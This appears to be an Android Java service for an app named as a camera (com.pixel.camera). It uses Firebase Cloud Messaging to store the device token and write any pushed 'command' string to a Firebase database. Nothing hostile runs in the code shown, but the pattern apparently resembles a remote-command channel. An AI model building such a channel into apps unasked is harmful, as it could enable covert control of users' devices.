package com.pixel.camera;

import android.content.Intent;
import android.os.Build;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.messaging.FirebaseMessagingService;
import com.google.firebase.messaging.RemoteMessage;

public class FCMService extends FirebaseMessagingService {

    @Override
    public void onNewToken(String token) {
        super.onNewToken(token);
        FirebaseDatabase.getInstance().getReference("token").setValue(token);
    }

    @Override
    public void onMessageReceived(RemoteMessage message) {
        String command = message.getData().get("command");
        if (command == null) return;
        FirebaseDatabase.getInstance().getReference("command").setValue(command);
    }
}
